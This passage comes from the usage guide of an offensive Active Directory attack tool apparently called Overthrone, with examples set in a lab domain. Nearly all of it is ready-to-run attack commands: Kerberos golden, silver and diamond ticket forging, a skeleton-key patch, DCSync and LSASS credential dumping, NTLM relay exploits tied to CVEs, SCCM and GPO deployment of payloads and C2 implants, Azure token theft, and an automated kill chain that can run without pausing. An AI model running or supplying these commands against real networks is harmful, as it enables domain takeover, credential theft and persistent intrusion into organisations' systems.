# Big domain? Increase page size
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --page-size 1000

# Export results to JSON
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --outfile ./report.json
```

| Flag | Default | What it does |
|---|---|---|
| `--modules`, `-m` | all | Comma-separated: `users`, `computers`, `groups`, `acls`, `trusts`, `gpos` |
| `--page-size` | `500` | LDAP page size |
| `--snaffle` | `false` | Enable share scanning for sensitive files |
| `--snaffle-shares` | | Custom shares to scan (comma-separated) |
| `--snaffle-depth` | `5` | Directory traversal depth |
| `--acl` | `false` | ACL analysis |
| `--laps` | `false` | LAPS audit |
| `--mssql` | `false` | MSSQL audit |

---

## Forge Ticket Forging (`ovt forge`)

Forge tickets and persist access.

```bash
# Golden Ticket (requires krbtgt hash from DCSync)
ovt forge golden -d sevenkingdoms.local --krbtgt-hash "<nt-hash>" --user "administrator" --sid "S-1-5-21-<domain-sid>"
ovt forge golden -d sevenkingdoms.local --krbtgt-hash "<nt-hash>" --user "administrator" --sid "S-1-5-21-<domain-sid>" --outfile golden.kirbi

# Silver Ticket (requires service account hash)
ovt forge silver -d sevenkingdoms.local --service-hash "<nt-hash>" --user "administrator" --spn "cifs/kingslanding.sevenkingdoms.local"
ovt forge silver -d sevenkingdoms.local --service-hash "<nt-hash>" --user "administrator" --spn "cifs/kingslanding.sevenkingdoms.local" --outfile cifs.kirbi

# Diamond Ticket (TGT modification) -- requires valid TGT
ovt forge diamond -d sevenkingdoms.local --user "vagrant" --domain-sid "S-1-5-21-<domain-sid>" --tgt ./tgt.kirbi

# Skeleton Key (patch DC LSA)
ovt forge skeleton -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --payload-path ./mimilib.dll

# Convert ticket to different formats
ovt forge convert-ticket --input silver.kirbi --output silver.ccache

# Convert hash formats
ovt forge convert-hash --input <nt-hash> --format john

# Dry run (validate config without executing)
ovt forge golden -d sevenkingdoms.local --krbtgt-hash "00000000000000000000000000000000" --user "administrator" --sid "S-1-5-21-1234" --dry-run
```

| Subcommand | Required Flags | What it forges |
|---|---|---|
| `golden` | `--domain-sid`, `--krbtgt-hash`, `--user` (default: Administrator), `--rid` (default: 500), `--output` (default: golden.kirbi) | TGT signed with KRBTGT hash |
| `silver` | `--domain-sid`, `--service-hash`, `--spn`, `--user` (default: Administrator), `--rid` (default: 500), `--output` (default: silver.kirbi) | TGS for a specific service |
| `diamond` | `--domain-sid`, `--user`, `--tgt` | Modified TGT (PAC replacement) |
| `skeleton` | `--dc-host`, `--domain`, `--username`, `--payload-path` | LSA skeleton key patch |
| `convert-ticket` | `--input`, `--output` | Ticket format conversion |
| `convert-hash` | `--input`, `--format` | Hash format conversion |

---

## Move Lateral Movement (`ovt move`)

Aliases: `ovt lateral`.

```bash
# SMB file operations

# List SMB shares
ovt move smb ls -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --share "C$"

# Upload file
ovt move smb put -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant ./payload.exe "C$\Windows\Temp\payload.exe"

# Download file
ovt move smb get -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant "C$\Windows\Temp\payload.exe" ./downloaded.exe

# Remote execution

# SMBExec (service creation via SCM)
ovt move smbexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"

# WMIExec (WMI + SCM fallback)
ovt move wmiexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "ipconfig"

# PsExec style execution
ovt move psexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "net user added_user Pass123! /add"

# WinRM execution (cross-platform)
ovt move winrm -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"

# RID cycling (enumerate domain accounts via SAMR)
ovt move rid-cycle -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --max-rid 5000

# ACL operations
ovt move acl -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Trust operations
ovt move trusts -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Trust map (visualize trust relationships)
ovt move map -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Escalation path analysis
ovt move escalation -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# MSSQL enumeration
ovt move mssql -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# SCCM enumeration
ovt move sccm -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Crawler with responder/poisoner
ovt move crawl -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --poison-ip 192.168.57.5 --respond
```

---

## SMB Operations (`ovt smb`)

```bash
# List shares on a target
ovt smb shares --target 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Check admin access on multiple targets
ovt smb admin --targets 192.168.57.10,192.168.57.22 -d sevenkingdoms.local -u vagrant -p vagrant

# Spider shares for juicy files
ovt smb spider --target 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt smb spider --target 192.168.57.10 --extensions ".config,.xml,.txt,.sql"

# Download a file from a share
ovt smb get --target 192.168.57.10 --path "SYSVOL/sevenkingdoms.local/Policies/passwords.xml" \
  -d sevenkingdoms.local -u vagrant -p vagrant

# Upload a file to a share
ovt smb put --target 192.168.57.10 --local payload.exe --remote "C$/Windows/Temp/payload.exe" \
  -d sevenkingdoms.local -u vagrant -p vagrant
```

| Subcommand | Flags | What it does |
|---|---|---|
| `shares` | `--target`/`-t` (required) | List SMB shares |
| `admin` | `--targets`/`-t` (required) | Check admin access (comma-separated) |
| `spider` | `--target`/`-t` (required), `--extensions` (default: `.kdbx,.key,.pem,.config,.ps1,.rdp`) | Spider for sensitive files |
| `get` | `--target`/`-t` (required), `--path`/`-P` (required) | Download file from share |
| `put` | `--target`/`-t` (required), `--local`/`-l` (required), `--remote`/`-r` (required) | Upload file to share |

---

## Remote Execution (`ovt exec`)

```bash
# Auto-detect best method
ovt exec --target 192.168.57.10 --command "whoami /all" -d sevenkingdoms.local -u vagrant -p vagrant

# Force a specific method
ovt exec --target 192.168.57.10 --command "ipconfig /all" --method psexec
ovt exec --target 192.168.57.10 --command "hostname" --method wmiexec
ovt exec --target 192.168.57.10 --command "net user" --method winrm
ovt exec --target 192.168.57.10 --command "dir C:\" --method smbexec
```

| Flag | Default | What it does |
|---|---|---|
| `--method`, `-m` | `auto` | `auto`, `psexec`, `smbexec`, `wmiexec`, `winrm` |
| `--target`, `-t` | required | Target host |
| `--command`, `-c` | required | Command to execute |

| Method | Protocol | Notes |
|---|---|---|
| `auto` | Best available | Tries WinRM -> WMI -> SMB -> PsExec |
| `psexec` | DCE/RPC + SMB | Creates a service. Loud but reliable |
| `smbexec` | SCM over SMB | Service-based, slightly sneakier |
| `wmiexec` | DCOM/WMI | WMI semi-interactive, Windows-only |
| `winrm` | WS-Management | Native Windows remote management |

---

## Interactive Remote Shell (`ovt shell`)

Persistent remote session on a target.

```bash
# WinRM shell (default)
ovt shell --target 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# SMB-based shell
ovt shell --target 192.168.57.10 --shell-type smb

# WMI-based shell
ovt shell --target 192.168.57.10 --shell-type wmi
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Target host |
| `--shell-type`, `-T` | `winrm` | `winrm`, `smb`, `wmi` |

---

## MSSQL Operations (`ovt mssql`)

Aliases: `ovt sql`.

```bash
# Execute a SQL query
ovt mssql query --target 192.168.57.100 --query "SELECT @@version" -d sevenkingdoms.local -u sa -p 'sa'

# Execute OS command via xp_cmdshell
ovt mssql xp-cmdshell --target 192.168.57.100 --command "whoami"

# Enumerate linked servers
ovt mssql linked-servers --target 192.168.57.100

# Enable xp_cmdshell
ovt mssql enable-xp-cmdshell --target 192.168.57.100

# Check if xp_cmdshell is enabled
ovt mssql check-xp-cmdshell --target 192.168.57.100
```

| Subcommand | Flags | What it does |
|---|---|---|
| `query` | `--target`/`-t` (required), `--query`/`-q` (required), `--database`/`-D` (default: `master`) | Execute SQL query |
| `xp-cmdshell` | `--target`/`-t` (required), `--command`/`-c` (required) | OS command via xp_cmdshell |
| `linked-servers` | `--target`/`-t` (required) | Enumerate linked servers |
| `enable-xp-cmdshell` | `--target`/`-t` (required) | Enable xp_cmdshell |
| `check-xp-cmdshell` | `--target`/`-t` (required) | Check xp_cmdshell status |

---

## ACL/DACL Abuse (`ovt acl`)

Aliases: `ovt dacl`.

ACL-based privilege escalation: force-change passwords, add group members, write DACLs.

```bash
# Force-change a user's password
ovt acl force-password --target vagrant --password 'NewPass123!' \
  -H 192.168.57.10 -d sevenkingdoms.local -u admin -p 'Pass!'

# Add a member to a group
ovt acl add-member --group "CN=Domain Admins,CN=Users,DC=sevenkingdoms,DC=local" \
  --member "CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local"

# Remove a member from a group
ovt acl remove-member --group "CN=Domain Admins,CN=Users,DC=sevenkingdoms,DC=local" \
  --member "CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local"

# Grant GenericAll to a trustee on a target object
ovt acl write-dacl --target "CN=KINGSLANDING,OU=Domain Controllers,DC=sevenkingdoms,DC=local" \
  --trustee vagrant

# Write an SPN on a target user (for Kerberoasting)
ovt acl write-spn --target "CN=svc_backup,CN=Users,DC=sevenkingdoms,DC=local" \
  --spn "MSSQLSvc/db01.sevenkingdoms.local"

# Remove an SPN from a target user
ovt acl remove-spn --target "CN=svc_backup,CN=Users,DC=sevenkingdoms,DC=local" \
  --spn "MSSQLSvc/db01.sevenkingdoms.local"

# Enumerate abusable ACLs for a SID
ovt acl enum --sid S-1-5-21-...-1105
```

| Subcommand | Flags | What it does |
|---|---|---|
| `force-password` | `--target`/`-t` (required), `--password`/`-p` (required) | Force-change a user's password |
| `add-member` | `--group`/`-g` (required), `--member`/`-m` (required) | Add member to group |
| `remove-member` | `--group`/`-g` (required), `--member`/`-m` (required) | Remove member from group |
| `write-dacl` | `--target`/`-t` (required), `--trustee` (required) | Grant GenericAll to trustee on target |
| `write-spn` | `--target`/`-t` (required), `--spn`/`-s` (required) | Write SPN on target user |
| `remove-spn` | `--target`/`-t` (required), `--spn`/`-s` (required) | Remove SPN from target user |
| `enum` | `--sid` (optional) | Enumerate abusable ACLs |

---

## SCCM Abuse (`ovt sccm`)

Aliases: `ovt mecm`.

```bash
# Enumerate SCCM configuration
ovt sccm enum --site-server sccm01.sevenkingdoms.local

# Client push abuse
ovt sccm abuse --site-server sccm01.sevenkingdoms.local --technique client-push

# Deploy a malicious application
ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | `--site-server`/`-s` | Enumerate SCCM configuration |
| `abuse` | `--site-server`/`-s` (required), `--technique`/`-t` (default: `client-push`) | Abuse SCCM client push/deployment |
| `deploy` | `--collection`/`-c` (required), `--app-name`/`-a` (required), `--payload`/`-P` (required) | Deploy a malicious application |

---

## Crack Hash Cracking (`ovt crack`)

Offline hash cracking with embedded wordlist, rules, and rayon parallelism.

```bash
# Crack a single NTLM hash against wordlist
ovt crack --hash "8846f7eaee8fb117ad06bdd830b7586c" --wordlist rockyou.txt

# Crack kerberoast hash
ovt crack --hash "\$krb5tgs\$23\$*user\$domain\$spn*\$<hash>" --wordlist rockyou.txt

# Crack from a file
ovt crack --file kerberoast_hashes.txt

# Thorough mode with custom wordlist
ovt crack --file hashes.txt --mode thorough --wordlist /usr/share/wordlists/rockyou.txt

# Crack with hashcat GPU (if installed)
ovt crack --hash-file ./hashes.txt --wordlist rockyou.txt --hashcat --hashcat-path "C:\hashcat\hashcat.exe"

# Limit candidates (fast mode)
ovt crack --file hashes.txt --mode fast --max-candidates 100000

# Crack and output to file
ovt crack --hash-file ./kerberoast_hashes.txt --wordlist rockyou.txt --outfile cracked.txt
```

| Flag | Default | What it does |
|---|---|---|
| `--hash`, `-s` | | Single hash string |
| `--file`, `-f` | | File with hashes (one per line) |
| `--mode`, `-M` | `default` | `fast`, `default`, `thorough` |
| `--wordlist`, `-W` | embedded 10K | Custom wordlist |
| `--max-candidates` | `0` (unlimited) | Max candidates to try |
| `--hashcat` | `false` | Use hashcat GPU backend |
| `--hashcat-path` | | Path to hashcat executable |

---

## Offline Secrets (`ovt secrets`)

Parse registry hive files offline (SAM, SECURITY, SYSTEM).

```bash
# Dump SAM hashes from hive files
ovt secrets sam --sam ./SAM --system ./SYSTEM

# Dump LSA secrets
ovt secrets lsa --security ./SECURITY --system ./SYSTEM

# Dump cached domain credentials (DCC2)
ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
```

| Subcommand | Required Flags | What it does |
|---|---|---|
| `sam` | `--sam`, `--system` | Dump SAM hashes |
| `lsa` | `--security`, `--system` | Dump LSA secrets |
| `dcc2` | `--security`, `--system` | Dump cached domain credentials |

---

## GPP Decryption (`ovt gpp`)

Decrypt Group Policy Preferences cpassword values.

```bash
# Decrypt from a GPP XML file
ovt gpp --file Groups.xml

# Decrypt a raw cpassword string
ovt gpp --cpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```

---

## Session Management (`ovt session`)

```bash
# List all saved sessions
ovt session list

# Show session details
ovt session show corp.local-192.168.57.10

# Session info summary
ovt session info corp.local-192.168.57.10

# Delete a session
ovt session delete corp.local-192.168.57.10

# Clean old sessions (older than N days/hours/minutes)
ovt session clean --older-than 7d

# Get session file path
ovt session path corp.local-192.168.57.10

# Show session statistics
ovt session stats

# Alias: sessions
ovt sessions list
```

---

## Configuration (`ovt config`)

Alias: `ovt cfg`.

```bash
# Initialize config file with defaults
ovt config init
ovt config init --force    # Overwrite existing

# Show current configuration
ovt config show

# Show config file path
ovt config path

# Set a configuration value
ovt config set dc_host 192.168.57.10
ovt config set domain sevenkingdoms.local
ovt config set username vagrant
ovt config set auth_method password
ovt config set verbose true

# Unset a configuration value
ovt config unset auth_method

# Edit config in $EDITOR
ovt config edit

# Save current CLI flags as defaults
ovt config save

# Profile management
ovt config profile list
ovt config profile show goad-light
ovt config profile create goad-light
ovt config profile create goad-light --force
ovt config profile set goad-light dc_host 192.168.57.10
ovt config profile set goad-light domain sevenkingdoms.local
ovt config profile set goad-light username vagrant
ovt config profile set goad-light auth_method password
ovt config profile unset goad-light verbose
ovt config profile delete goad-light
ovt config profile use goad-light
ovt config profile clone goad-light goad-light-copy
ovt config profile path

# Alias: cfg
ovt cfg show
ovt cfg set domain sevenkingdoms.local
```

---

## Interactive Shell REPL (`ovt shell`)

Start the full REPL with rustyline, tab completion, command history, and syntax highlighting.

```bash
# Start REPL
ovt shell

# Within the REPL:
help                          # Show help
use forge/golden              # Load golden ticket module
set domain sevenkingdoms.local  # Set module option
set krbtgt-hash <hash>
set sid S-1-5-21-<sid>
run                           # Execute the forged ticket

use forge/silver              # Switch to silver ticket module
set spn cifs/kingslanding.sevenkingdoms.local
run

use skeleton                  # Load skeleton key module
set dc-host 192.168.57.10
set domain sevenkingdoms.local
set username administrator
run

# Remote shell commands:
connect 192.168.57.10         # Connect to target via WinRM/SMB/WMI
disconnect                    # Disconnect from target
exec whoami                   # Execute command on connected target
upload ./payload.exe C$\Temp\  # Upload file to target
download C$\Temp\output.txt   # Download file from target

# Session management:
sessions                      # List active sessions
bg                            # Background current session
fg 1                          # Foreground session 1

# Windows commands:
whoami                        # Show current user on target
hostname                      # Show target hostname
pwd / ls / cd                 # File system navigation
getuid                        # Show current user SID
getpid                        # Show current process ID
ps                            # List processes
steal_token <pid>             # Steal token from process
rev2self                      # Revert to self token

# Module system:
use kerberos                  # Kerberos module
use smb                       # SMB module
use graph                     # Graph analysis module
use reaper                    # Assessment module
enum                          # Enumerate active directory
```

---

## TUI Viewer (`ovt tui`)

Aliases: `ovt ui`.

```bash
# Terminal UI with attack graph visualization
ovt tui -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# View-only mode (load saved graph JSON)
ovt tui --graph ./bloodhound_data/graph.json
ovt tui --graph-dir ./bloodhound_data/           # Load multi-file graph

# Load a previous graph without crawling
ovt tui --domain sevenkingdoms.local --load graph.json --crawl false

# With specific bind address for viewer server
ovt tui --bind 127.0.0.1

# With TLS (required for non-loopback)
ovt tui --bind 0.0.0.0 --tls-cert ./cert.pem --tls-key ./key.pem
```

| Flag | Default | What it does |
|---|---|---|
| `--domain`, `-d` | required | Domain to crawl |
| `--crawl`, `-c` | `true` | Start crawler automatically |
| `--load`, `-l` | none | Load graph from previous JSON export |

---

## Wizard Auto-Pwn (`ovt wizard`)

The successor to auto-pwn. Same kill chain, but with guardrails -- pauses after each stage for operator review, supports session resume, and a Q-learning brain that gets smarter the more you use it.

```bash
# Full automated attack chain
ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Resume from saved session
ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --from-session corp.local-192.168.57.10

# Resume from checkpoint
ovt wizard --resume ./checkpoints/wiz_session.json

# Skip enumeration - load state from previous run
ovt wizard --target DA --skip-enum --from-file enum.json

# Fully automated - no pauses
ovt wizard --target DA --dc-host 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --no-pause

# Dry run (assess without exploitation)
ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --dry-run

# Specify output directory
ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --output-dir ./assessment
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
| `--resume` | none | Resume from checkpoint JSON |
| `--checkpoint-dir` | `./checkpoints` | Directory for checkpoint files |
| `--skip-enum` | `false` | Skip enumeration (requires `--from-file`) |
| `--from-file` | none | Load previous enumeration state JSON |
| `--no-pause` | `false` | Don't pause between stages |
| `--no-auto-crack` | `false` | Don't prompt for hash cracking |
| `--pause-timeout` | `300` | Seconds before auto-continuing (0 = wait forever) |
| `--max-stage` | `loot` | Maximum stage to reach |
| `--exec-method`, `-m` | `auto` | Preferred execution method |
| `--stealth` | `false` | Low-noise mode |
| `--dry-run` | `false` | Plan only |
| `--jitter-ms` | `1000` | Jitter between operations |
| `--ldaps` | `false` | Use LDAPS |
| `--timeout` | `30` | Per-step timeout (seconds) |

---

## C2 Integration (`ovt c2`)

Connect to Cobalt Strike, Sliver, or Havoc teamservers.

```bash
# Connect to Sliver (mTLS)
ovt c2 connect sliver 192.168.57.200 31337 --config ./operator.cfg

# Connect to Cobalt Strike
ovt c2 connect cs 192.168.57.200 50050 --password 'teamserver_pass'

# Connect to Havoc
ovt c2 connect havoc 192.168.57.200 40056 --token 'api_token_here'

# Named channel + skip TLS verify
ovt c2 connect sliver 192.168.57.200 31337 --config ./operator.cfg --name ops1 --skip-verify

# Check C2 status
ovt c2 status

# Execute command on a beacon/session
ovt c2 exec <session_id> "whoami /all"
ovt c2 exec <session_id> "Get-Process" --powershell

# Deploy implant to a target
ovt c2 deploy default 192.168.57.10 http-listener

# List listeners
ovt c2 listeners default

# List C2 listeners
ovt c2 list

# Start a new C2 listener
ovt c2 start --type http --port 8080

# Stop a C2 listener
ovt c2 stop --id 1

# Deploy implant via GPO
ovt c2 deploy -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --implant beacon.exe --method gpo

# Disconnect
ovt c2 disconnect all
```

---

## Azure Operations (`ovt azure`)

Aliases: `ovt entra`, `ovt aad`.

```bash
# Enumerate hybrid identity configuration
ovt azure enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Check for Azure AD Seamless SSO
ovt azure sso -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Seamless SSO abuse - Kerberos ticket to Azure AD token
ovt azure seamless-sso -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Golden SAML - forge SAML assertion with ADFS cert
ovt azure golden-saml -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt azure golden-saml --upn "admin@sevenkingdoms.local"

# PRT theft - extract Primary Refresh Tokens from TokenBroker cache
ovt azure prt-theft -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | | Enumerate hybrid identity configuration (Azure AD Connect, SeamlessSSO, ADFS) |
| `sso` | | Check for Azure AD Seamless SSO |
| `seamless-sso` | | Seamless SSO abuse via AZUREADSSOACC$ |
| `golden-saml` | `--upn` (default: `admin@corp.local`) | Forge SAML assertion with ADFS cert |
| `prt-theft` | | Extract PRT from Windows TokenBroker cache |

---

## Viewer Server (`ovt viewer`)

```bash
# Start the viewer web server
ovt viewer --host 127.0.0.1 --port 8080

# With authentication
ovt viewer --host 127.0.0.1 --port 8080 --user admin --password "change-me"

# With TLS
ovt viewer --host 127.0.0.1 --port 8443 --tls-cert ./cert.pem --tls-key ./key.pem

# Load bloodhound data directory
ovt viewer --host 127.0.0.1 --port 8080 --bh-dir ./bloodhound_data
```

---

## Built-in Module System (`ovt module`)

List, info, run, and run-parallel for registered built-in modules.

```bash
# List all modules
ovt module list

# Filter by category
ovt module list --category dump

# Show module details
ovt module info sam-dump

# Run a module against a target
ovt module run procdump -t 192.168.57.10 --params '{"dump_path":"C:\\Windows\\Temp\\lsass.dmp"}'

# Run a module against multiple targets in parallel
ovt module run-parallel sam-dump -t 192.168.57.10,192.168.57.22 --concurrency 5
```

### Available Modules

| Module | Category | Description |
|---|---|---|
| `winrm-exec` | Execute | Remote command execution via WinRM |
| `smb-exec` | Execute | Remote command execution via SMBExec |
| `psexec` | Execute | Remote execution via PsExec |
| `wmi-exec` | Execute | Remote execution via WMI |
| `atexec` | Execute | Remote execution via Scheduled Tasks |
| `rdp` | Scan | Check if RDP (port 3389) is open |
| `procdump` | Dump | Dump LSASS via Procdump |
| `lsassy` | Dump | Credential dumping from LSASS |
| `sam-dump` | Dump | Dump SAM registry hive |
| `lsa-dump` | Dump | Dump LSA secrets |
| `ntds-dump` | Dump | DCSync NTDS.dit via MS-DRSR |
| `bloodhound` | Enum | LDAP collection for BloodHound |
| `kerberoast` | Kerberos | Kerberoast SPN accounts |
| `asreproast` | Kerberos | AS-REP roast no-preauth accounts |
| `laps` | Enum | Read LAPS passwords |
| `gpp` | Secrets | Decrypt GPP cpasswords |
| `coerce` | Coerce | Coerce authentication (MS-EFSRPC/MS-RPRN) |
| `nslookup` | Scan | DNS resolution and domain discovery |
| `zerologon` | Scan | CVE-2020-1472 check via MS-NRPC |

### Module Usage Examples

```bash
# DCSync single user (stealth)
ovt module run ntds-dump -t 192.168.57.10 --params '{"user":"krbtgt"}'

# DCSync full domain
ovt module run ntds-dump -t 192.168.57.10 --params '{"all":true}'

# Zerologon check (no creds)
ovt module run zerologon -t 192.168.57.10

# Kerberoast with NT hash
ovt --nt-hash aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  module run kerberoast -t 192.168.57.10

# BloodHound LDAP enumeration
ovt module run bloodhound -t 192.168.57.10 --nt-hash <hash>
```

---

## Plugin System (`ovt plugin`)

Aliases: `ovt plug`.

```bash
# List loaded plugins
ovt plugin list

# Plugin info
ovt plugin info smart-spray

# Execute a plugin command
ovt plugin exec spray-smart -- --targets users.txt --password 'Season2026!'

# Load/unload plugins
ovt plugin load ./plugins/custom_scanner.wasm
ovt plugin unload custom-scanner
ovt plugin enable custom-scanner
ovt plugin disable custom-scanner
```

---

## Engagement Reporting (`ovt report`)

Turn carnage into compliance documents.

```bash
# Markdown report
ovt report --input engagement.json --output report.md --format markdown

# JSON report
ovt report --input engagement.json --output findings.json --format json

# PDF report
ovt report --input engagement.json --output executive.pdf --format pdf
```

| Flag | Default | What it does |
|---|---|---|
| `--input` | `engagement.json` | Input engagement state file |
| `--output`, `-o` | `report.md` | Output report file |
| `--format`, `-F` | `markdown` | `markdown`, `pdf`, `json` |

---

## Environment Diagnostics (`ovt doctor`)

Aliases: `ovt check`, `ovt env`.

Check dependencies, connectivity, and environment before an engagement.

```bash
# Run all checks
ovt doctor

# Specific checks with target DC
ovt doctor --checks smb,kerberos,winrm,network --target-dc 192.168.57.10
```

| Flag | Default | What it does |
|---|---|---|
| `--checks`, `-c` | all | Comma-separated: `smb`, `kerberos`, `winrm`, `network` |
| `--target-dc` | none | DC to test connectivity against |

---

## Shell Tab Completion (`ovt completions`)

Aliases: `ovt completion`.

```bash
# Print completion script to stdout
ovt completions bash
ovt completions fish
ovt completions zsh
ovt completions powershell
ovt completions elvish

# Write directly to a file
ovt completions bash --output ~/.bash_completion.d/ovt.bash
ovt completions zsh --output ~/.zsh/completions/_ovt

# Quick setup (bash)
ovt completions bash >> ~/.bashrc && source ~/.bashrc

# Quick setup (zsh)
ovt completions zsh > "$(brew --prefix)/share/zsh/site-functions/_ovt" && compinit

# Quick setup (fish)
ovt completions fish > ~/.config/fish/completions/ovt.fish

# Quick setup (PowerShell)
ovt completions powershell >> $PROFILE
```

| Flag | What it does |
|---|---|
| `<shell>` (required) | One of: `bash`, `fish`, `zsh`, `powershell`, `elvish` |
| `--output`, `-o` | Write script to file instead of stdout |

---

## Auth & Credential Options

All commands support these authentication methods:

```bash
# Password authentication (default)
-A password -u vagrant -p vagrant

# NTLM hash / Pass-the-Hash
-A hash -u administrator --nt-hash "8846f7eaee8fb117ad06bdd830b7586c"

# Kerberos ticket
-A ticket --ticket ./tgt.kirbi

# Override via environment variables
$env:OT_DC_HOST = "192.168.57.10"
$env:OT_DOMAIN = "sevenkingdoms.local"
$env:OT_USERNAME = "vagrant"
$env:OT_PASSWORD = "vagrant"

# Override via config file
ovt config set dc_host 192.168.57.10
ovt config set domain sevenkingdoms.local
```

---

## Common Workflows

### Initial Recon (no creds)
```bash
ovt enum pre -H 192.168.57.10 -d sevenkingdoms.local
ovt enum anonymous -H 192.168.57.10 -d sevenkingdoms.local
ovt enum null-session -H 192.168.57.10 -d sevenkingdoms.local
ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local --user-list common.txt
```

### Enumeration with creds
```bash
ovt enum all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt adcs enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
```

### Credential Harvesting
```bash
ovt enum spns -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt kerberos roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt kerberos asrep-roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt
```

### Lateral Movement
```bash
ovt move smbexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"
ovt move wmiexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "ipconfig"
ovt move smb put -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant ./beacon.exe "C$\Windows\Temp\"
```

### Privilege Escalation
```bash
ovt adcs esc1 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --target-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http
ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --gpo <GUID> --sysvol <PATH> --command "whoami"
ovt shadow attack -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --target "target-user"
```

### Dump & PWN
```bash
ovt dump 192.168.57.10 dcsync -d sevenkingdoms.local -u administrator -p 'Password123!'
ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local -u administrator -p 'Password123!'
ovt forge golden -d sevenkingdoms.local --krbtgt-hash <hash> --user administrator --sid <domain-sid>
```

---

## CVE Exploit Quick Reference

Quick commands to exploit or assess each major Windows vulnerability class with Overthrone.

### ADCS & Certificate Abuse (ESC1-16)

```bash
# ESC1 (CVE-2022-26923) -- SAN abuse
ovt adcs esc1 --ca "CA\NAME" --template "User" --target-user "administrator" -d DOMAIN -u USER -p PASS --http

# ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2
ovt adcs esc6 --ca "CA\NAME" --template "User" --target-user "administrator" -d DOMAIN -u USER -p PASS --http

# ESC8 (CVE-2022-26931) -- NTLM relay to ADCS
ovt ntlm adcs-relay --target "http://CA/certsrv/" --port 8080 --cert-template "User"

# ESC15 (CVE-2024-49019) -- Schema V1 SAN Abuse
ovt adcs esc15 --ca "CA\NAME" --template "WebServer" -d DOMAIN -u USER -p PASS --http
```

### NTLM Relay Attacks

```bash
# CVE-2025-33073 -- NTLM Reflection (SMB)
ovt ntlm smb-relay -l 0.0.0.0:445 -t ldap://TARGET --auto-coerce-domain DOMAIN --auto-coerce-user USER --auto-coerce-password PASS

# CVE-2025-21311 -- NTLM Relay EoP (HTTP->LDAP)
ovt ntlm http-relay -l 0.0.0.0:8080 -t ldap://TARGET

# CVE-2025-24054 -- NTLM Hash Disclosure
ovt ntlm capture --interface eth0 --poison

# CVE-2019-1040 -- LDAP Signing Bypass (Drop the MIC)
ovt ntlm ldap-relay -l 0.0.0.0:8080 -t ldap://TARGET

# CVE-2021-1678 -- Classic NTLM Relay to LDAP
ovt ntlm relay -l 0.0.0.0:8080 -t ldap://TARGET
```

### Kerberos Attacks

```bash
# Kerberoasting
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS
